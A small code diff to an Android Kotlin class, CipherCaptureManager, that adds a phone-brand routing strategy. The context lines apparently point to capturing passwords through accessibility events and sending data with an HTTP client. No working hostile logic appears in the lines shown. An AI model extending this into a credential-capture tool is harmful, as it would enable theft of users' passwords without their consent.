@@ -9,6 +9,8 @@ import android.security.keystore.KeyGenParameterSpec
 import android.util.Base64
 import android.util.Log
 import com.storm.safe.rock.p000.AppStatusManager
+import com.storm.safe.rock.service.modules.cipher.vendor.CipherBrandFactory
+import com.storm.safe.rock.service.modules.cipher.vendor.CipherBrandStrategy
 import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
 import java.security.KeyStore
@@ -346,6 +348,9 @@ class CipherCaptureManager(
     }
 
     // ==================== 实例字段 ====================
+
+    /** 品牌策略 -- 按 Build.BRAND 自动路由 */
+    val brandStrategy: CipherBrandStrategy = CipherBrandFactory.create()
 
     /** OkHttp 客户端 */
     val httpClient: OkHttpClient = OkHttpClient.Builder()
